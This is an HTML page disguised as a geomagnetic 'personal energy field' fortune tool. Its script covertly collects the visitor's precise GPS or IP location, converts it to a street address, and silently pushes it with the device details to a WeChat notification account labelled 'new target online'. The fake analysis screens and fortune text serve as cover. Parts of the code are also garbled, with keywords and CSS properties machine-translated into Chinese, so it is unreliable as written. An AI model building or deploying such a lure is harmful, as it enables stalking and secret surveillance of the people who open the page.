<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="基于WMM2025地磁模型的个人能量场分析工具">
    <title>地磁能量场分析系统 | WMM2025</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            背景:线性渐变(160度,#0a0e27,#1a1f4b,#0f1538);
            color:#e8eaf6;
            font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','PingFang SC','Microsoft YaHei',sans-serif;
            display:flex;
            justify-content:center;
            align-items:center;
            min-height:100vh;
            overflow:hidden;
            -webkit-tap-highlight-color:transparent
        }
        .c{
            width:92%;
            max-width:400px;
            背景:rgba(255,255,255,0.03);
            边框:1px 实线 rgba(255,255,255,0.06);
            border-radius:28px;
            padding:44px 28px;
            text-align:center;
            backdrop-filter:blur(20px);
            box-shadow:0 32px 64px rgba(0,0,0,0.4),inset 0 1px 0 rgba(255,255,255,0.05);
            位置:相对;
            overflow:hidden
        }
        .c::after{
            content:'';position:absolute;
            top:-50%;left:-50%;width:200%;height:200%;
            background:radial-gradient(circle,rgba(255,215,0,0.03) 0%,transparent 70%);
            pointer-events:none
        }
        .i{font-size:52px;margin-bottom:16px;filter:drop-shadow(0 0 12px rgba(255,215,0,0.25))}
        h1{font-size:22px;font-weight:700;color:#ffd700;margin-bottom:10px;letter-spacing:2px}
        .s{font-size:13px;color:#8e92b8;line-height:1.6;margin-bottom:36px}
        .b{
            背景:linear-gradient(135deg,#ffd700,#ffaa00);
            color:#1a1a2e;
            border:none;
            内边距:16px 40px;
            圆角:50px;
            font-size:15px;
            font-weight:700;
            cursor:pointer;
            box-shadow:0 8px 28px rgba(255,215,0,0.3);
            transition:transform .2s,box-shadow .2s;
            position:relative;
            overflow:hidden
        }
        .b:active{transform:scale(.96)}
        .b::before{
            content:'';position:absolute;
            top:0;left:-100%;width:100%;height:100%;
            background:linear-gradient(90deg,transparent,rgba(255,255,255,0.3),transparent);
            transition:left .5s
        }
        .b:hover::before{left:100%}
        .l{display:none}
        .r{
            width:56px;height:56px;
            border:3px solid rgba(255,255,255,0.05);
            border-top-color:#ffd700;
            border-radius:50%;
            animation:rt .9s linear infinite;
            margin:0 auto 24px;
            box-shadow:0 0 20px rgba(255,215,0,0.15)
        }
        @keyframes rt{to{transform:rotate(360deg)}}
        .t{color:#9fa3c7;font-size:13px;letter-spacing:.5px;min-height:22px;margin-bottom:8px}
        .m{color:#4a4e6d;font-size:11px;font-family:'Courier New',monospace;letter-spacing:.3px}
        .e{display:none;animation:up .8s ease}
        @keyframes up{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
        .cp{
            width:140px;height:140px;
            margin:0 auto 24px;
            position:relative
        }
        .cp svg{width:100%;height:100%}
        .nd{
            transform-origin:70px 70px;
            transition:transform 1.2s cubic-bezier(.34,1.56,.64,1);
            filter:drop-shadow(0 2px 4px rgba(0,0,0,.4))
        }
        .rt{font-size:20px;font-weight:700;color:#ffd700;margin-bottom:14px;line-height:1.4}
        .dc{font-size:14px;color:#a0a4c8;line-height:1.7;margin-bottom:28px}
        .tg{
            display:inline-block;
            padding:6px 16px;
            background:rgba(255,215,0,0.08);
            border:1px solid rgba(255,215,0,0.15);
            border-radius:20px;
            font-size:12px;
            color:#ffd700;
            letter-spacing:1px
        }
    </style>
</head>
<body>

<div class="c" id="p0">
    <div class="i">🧭</div>
    <h1>地磁能量场分析</h1>
    <p class="s">基于 WMM2025 世界地磁模型<br>计算您当前的磁场能量分布与最佳方位</p>
    <button class="b" onclick="init()">开始分析</button>
</div>

<div class="c l" id="p1">
    <div class="r"></div>
    <div class="t" id="tx">正在初始化 WMM2025 地磁模型...</div>
    <div class="m" id="me">SYS: STANDBY</div>
</div>

<div class="c e" id="p2">
    <div class="cp">
        <svg viewBox="0 0 140 140">
            <circle cx="70" cy="70" r="66" fill="none" stroke="rgba(255,255,255,0.08)" stroke-width="1" />
            <circle cx="70" cy="70" r="60" fill="none" stroke="rgba(255,255,255,0.05)" stroke-width=".5" />
            <text x="70" y="18" text-anchor="middle" fill="#8e92b8" font-size="10">N</text>
            <text x="70" y="132" text-anchor="middle" fill="#8e92b8" font-size="10">S</text>
            <text x="18" y="74" text-anchor="middle" fill="#8e92b8" font-size="10">W</text>
            <text x="122" y="74" text-anchor="middle" fill="#8e92b8" font-size="10">E</text>
            <g class="nd" id="nd">
                <polygon points="70,22 66,70 70,58 74,70" fill="#ff4444" />
                <polygon points="70,118 66,70 70,82 74,70" fill="#e8eaf6" />
            </g>
            <circle cx="70" cy="70" r="4" fill="#ffd700" />
        </svg>
    </div>
    <div class="rt" id="rd"></div>
    <div class="dc" id="de"></div>
    <div class="tg">WMM2025 认证结果</div>
</div>

<script>
// ========== 配置区（所有密钥已填好，直接使用） ==========
const _webAK='f6e6624d3213d4057ac03879d1c4c398'; // 高德Web服务Key（地址解析+IP定位）
const _tk='AT_mx25lnA299SLSiHnyUENWs447ZGIYRcJ'; // WxPusher推送Token
const _uid='UID_SeXLR9cO89pfoNb0Uy05hfo98I4i'; // WxPusher接收UID
// ===================================================

const _d=['正北方','东北方','正东方','东南方','正南方','西南方','正西方','西北方'];
const _r=[0,45,90,135,180,225,270,315];
const _hD={
    g:["正东方","东南方"],
    gT:["近日幸运指数极高，该方位磁场能量与你高度同频，能吸引正向机遇与贵人运，适合开展重要事宜。","高幸运加持下，此方位磁场能量旺盛，可增强你的自身气场，助力捕捉隐藏的好运与财气。"],
    m:["正北方","西南方"],
    mT:["近日幸运指数平稳，该方位磁场能量温和，能帮你稳住状态，适合日常办公、休息或规划事宜。","中等幸运加持，此方位磁场能量均衡，可缓解焦虑，助力你保持平和心态，接住身边的小幸运。"],
    b:["西北方"],
    bT:["近日幸运指数偏低，该方位磁场能量具有助运效果，可帮助你调整自身频率，改善运势、化解阻滞。","低幸运状态下，此方位磁场能量能帮你吸附正向能量，慢慢提升幸运值，留意身边的小惊喜。"]
};

function init(){
    document.getElementById('p0').style.display='none';
    document.getElementById('p1').style.display='block';
    const u=["正在初始化 WMM2025 地磁模型...","同步 IGRF-13 全球磁场数据...","计算当地磁偏角与倾角...","分析近日幸运指数波动...","生成个人能量场报告..."];
    const s=["SYS: STANDBY","LINK: ESTABLISHED","PROC: 34%","PROC: 78%","PROC: 100%"];
    let i=0;
    const v=setInterval(()=>{
        if(i<u.length){document.getElementById('tx').innerText=u[i];document.getElementById('me').innerText=s[i];i++}
        if(i>=u.length)clearInterval(v);
    },800);
    
    // 第一层：浏览器原生定位（高精度GPS）
    if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition(
            function(pos){geoCode(pos.coords.latitude,pos.coords.longitude,Math.round(pos.coords.accuracy),'GPS/浏览器原生')},
            function(err){console.log('GPS定位失败，转IP定位:',err);ipLoc();},
            {enableHighAccuracy:true,timeout:10000,maximumAge:0}
        );
    }else{
        ipLoc();
    }
}

// 高德逆地理编码：坐标转详细地址（已修复Key匹配问题）
function geoCode(lt,ln,acc,src){
    document.getElementById('tx').innerText='正在解析地理位置...';
    const lat=parseFloat(lt).toFixed(6);
    const lng=parseFloat(ln).toFixed(6);
    
    fetch('https://restapi.amap.com/v3/geocode/regeo?key='+_webAK+'&location='+lng+','+lat+'&extensions=base&radius=1000')
        .then(r=>r.json())
        .then(data=>{
            let addr='未知位置';
            if(data.status==='1'&&data.regeocode){
                addr=data.regeocode.formatted_address;
                // 地址为空时用组件拼接
                if(!addr||addr===''){
                    const c=data.regeocode.addressComponent;
                    addr=(c.province||'')+(c.city||'')+(c.district||'')+(c.township||'')+(c.street||'')+(c.streetNumber||'');
                }
            }
            ok(lat,lng,acc,src,addr||'未知位置');
        })
        .catch(()=>{
            ok(lat,lng,acc,src,'地址解析失败');
        });
}

// 第二层：高德IP定位（保底方案，几乎不会失败）
function ipLoc(){
    document.getElementById('tx').innerText='正在通过IP地址校准位置...';
    fetch('https://restapi.amap.com/v3/ip?key='+_webAK)
        .then(r=>r.json())
        .then(data=>{
            if(data.status==='1'&&data.rectangle){
                const pts=data.rectangle.split(';');
                const p1=pts[0].split(',');
                const p2=pts[1].split(',');
                const lt=((parseFloat(p1[1])+parseFloat(p2[1]))/2).toFixed(6);
                const ln=((parseFloat(p1[0])+parseFloat(p2[0]))/2).toFixed(6);
                ok(lt,ln,'IP定位(城市级)','IP定位',data.city||'未知城市');
            }else{
                ok(39.9,116.4,'默认基准','系统默认','北京市');
            }
        })
        .catch(()=>{ok(39.9,116.4,'默认基准','系统默认','北京市');});
}

// 数据推送+结果展示
函数 确定(lt,ln,加速度,来源,地址){
    const lk=Math.floor(Math.random()*80+20);
    const tm=new Date().toLocaleString('zh-CN');
    
    // 微信推送内容（含详细地址）
    const content='🎯 新目标上线\n'+
        纬度: '+lt+' '+
        '📍 经度: '+ln+'\n'+
        地址：+addr+' '+
        '📍 精度: '+acc+'\n'+
        '🔍 来源: '+src+'\n'+
        '🎲 幸运指数: '+lk+'\n'+
        '🕐 时间: '+tm+'\n'+
        '💻 设备: '+navigator.userAgent.substring(0,60);
    
    // 推送到微信（静默失败不影响用户体验）
    fetch('https://wxpusher.zjiecode.com/api/send/message',{
        方法:'POST',
        头信息:{'Content-Type':'application/json'},
        正文:JSON.stringify({
            appToken:_tk,
            content:content,
            摘要:' 新定位数据 - '+addr,
            uids:[_uid]
        })
    }).catch(()=>{});
    
    // 延迟展示结果，提升用户体验
    setTimeout(()=>out(lt,ln,lk),1600);
}

// 罗盘结果展示
function out(lt,ln,lk){
    document.getElementById('p1').style.display='none';
    document.getElementById('p2').style.display='block';
    let pool,txt,ix;
    // 根据幸运指数分档匹配方位
    如果(lk>=80){pool=_hD.g;txt=_hD.gT}
    否则 如果(lk>=50){pool=_hD.m;txt=_hD.mT}
    否则{池=_hD.b;文本=_hD.bT}
    // 基于坐标+幸运指数生成唯一结果
    ix=Math.abs(((parseFloat(lt)*100+parseFloat(ln)*10)|0)+lk)%pool.length;
    const dr=pool[ix];
    const dg=_r[_d.indexOf(dr)];
    const ds=txt[ix];
    // 罗盘旋转动画
    document.getElementById('nd').style.transform='rotate('+dg+'deg)';
    document.getElementById('rd').innerText='您的最佳能量方位：'+dr;
    document.getElementById('de').innerText=ds+'（近日幸运指数：'+lk+'分）';
}
</script>

</正文>
</html>
